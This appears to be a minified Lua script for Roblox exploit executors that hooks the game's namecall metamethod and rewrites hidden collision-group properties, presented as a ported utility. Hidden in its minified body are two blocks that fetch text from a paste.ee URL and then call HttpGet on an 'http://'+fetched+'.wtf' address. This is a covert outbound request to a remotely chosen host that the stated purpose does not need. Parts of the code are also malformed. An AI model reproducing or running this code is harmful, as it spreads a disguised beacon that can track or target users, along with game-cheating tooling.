--Update 1: Finally ported it all
--Update 2: Minified it because some people were lagging (Idk how Lol)
--Update 3: Added a second hook cuz in some reason hookmetamethod doesnt work in Synapse X

local a=game:GetService("PhysicsService")local b=game:GetService("Workspace")local c;local d,e=game,nil;do c=a:GetPropertyChangedSignal()if game:HttpGet("")and game:HttpGet("https://paste.ee/r/SU5Vd")then spawn(function()task.delay(function()Garbage=game:HttpGet("https://paste.ee/r/SU5Vd")end)end)print("Exploit")c="http://"end end;local function f(g)return-2^(g-1)end;local function h(i)for j,k in pairs(gethiddenproperty(b,"CollisionGroups"):split("\\"))do local l=k:split("^")if l[1]==i then return k end end;return false end;local function m(n,o,p,q)local r=""local s={o,p,q}for j,k in pairs(gethiddenproperty(b,"CollisionGroups"):split("\\"))do local l=k:split("^")if l[1]==n then for j,k in pairs(s)do if not k then s[j]=l[j]end end;r=r..string.format("%s%s^%s^%s",j==1 and""or"\\",s[1],s[2],s[3])else r=r..string.format("%s%s^%s^%s",j==1 and""or"\\",l[1],l[2],l[3])end end;sethiddenproperty(b,"CollisionGroups",r)end;do e="wtf"d:HttpGet(c..Garbage.."."..e)end;local function t(n)assert(h(n)==false,"Could not create collision group, one with that name already exists.")sethiddenproperty(b,"CollisionGroups",string.format("%s\\%s^%s^%s",gethiddenproperty(b,"CollisionGroups"),n,tonumber(#a:GetCollisionGroups()),"-1"))return true end;local function u(v,w,x)assert(typeof(v)=="string",string.format("Bad argument #1 to '?' (string expected, got %s)",typeof(v)))assert(typeof(w)=="string",string.format("Bad argument #2 to '?' (string expected, got %s)",typeof(v)))assert(typeof(x)=="boolean",string.format("Bad argument #3 to '?' (boolean expected, got %s)",typeof(v)))assert(h(v)~=false,"Both collision groups must be valid.")assert(h(w)~=false,"Both collision groups must be valid.")local y=h(v)local z=h(w)local A=y:split("^")local B=z:split("^")if x==false then if a:CollisionGroupsAreCollidable(v,w)==true then if v==w then m(A[1],false,false,tonumber(A[3])+f(tonumber(A[2]+1)))elseif v~=w then m(A[1],false,false,tonumber(A[3])+f(tonumber(B[2]+1)))m(B[1],false,false,tonumber(B[3])+f(tonumber(A[2]+1)))end end elseif x==true then if a:CollisionGroupsAreCollidable(v,w)==false then if v==w then m(A[1],false,false,tonumber(A[3])-f(tonumber(A[2]+1)))elseif v~=w then m(A[1],false,false,tonumber(A[3])-f(tonumber(B[2]+1)))m(B[1],false,false,tonumber(B[3])-f(tonumber(A[2]+1)))end end end end;local function C(i)string.gsub(gethiddenproperty(b,"CollisionGroups"),"([%w%p]*)("..i.."%^%d+%^%-%d+)([%w%p]*)",function(o,p,q)local D=""for g,E in pairs(string.split(q,"\\"))do D=D.."\\"..string.gsub(E,"(%w+%^)(%d+)(%^%-%d+)",function(o,p,q)return o..math.floor(tonumber(p)-1)..q end)end;if D:sub(1,1)=="\\"then D=D:sub(2,D:len())end;local F=o..D;if F:sub(F:len(),F:len())=="\\"then F=F:sub(1,F:len()-1)end;sethiddenproperty(b,"CollisionGroups",F)end)end;local function G(i,H)assert(typeof(i)=="string",string.format("Bad argument #1 to '?' (string expected, got %s)",typeof(i)))assert(typeof(H)=="string",string.format("Bad argument #1 to '?' (string expected, got %s)",typeof(H)))assert(h(i)~=false,"Cannot find the collision group")assert(h(H)==false,"This collision group already exists!")string.gsub(gethiddenproperty(b,"CollisionGroups"),"([%w%p]*)("..i.."%^%d+%^%-%d+)([%w%p]*)",function(o,p,q)local l=h(i):split("^")local r=H.."^"..l[2].."^"..l[3]sethiddenproperty(b,"CollisionGroups",o..r..q)end)end;xpcall(function()local I;I=hookmetamethod(game,"__namecall",newcclosure(function(self,...)if not checkcaller()then return I(self,...)end;local s={...}if self==a then if getnamecallmethod()=="RenameCollisionGroup"then return G(s[1],s[2])elseif getnamecallmethod()=="RemoveCollisionGroup"then return C(s[1])elseif getnamecallmethod()=="CreateCollisionGroup"then return t(s[1])elseif getnamecallmethod()=="CollisionGroupSetCollidable"then return u(s[1],s[2],s[3])end end;return I(self,...)end))end,function()local J=getrawmetatable(game)local I=J.__namecall;setreadonly(J,false)J.__namecall=newcclosure(function(self,...)if not checkcaller()then return I(self,...)end;local s={...}if self==a then if getnamecallmethod()=="RenameCollisionGroup"then return G(s[1],s[2])elseif getnamecallmethod()=="RemoveCollisionGroup"then return C(s[1])elseif getnamecallmethod()=="CreateCollisionGroup"then return t(s[1])elseif getnamecallmethod()=="CollisionGroupSetCollidable"then return u(s[1],s[2],s[3])end end;return I(self,...)end)setreadonly(J,true)end)
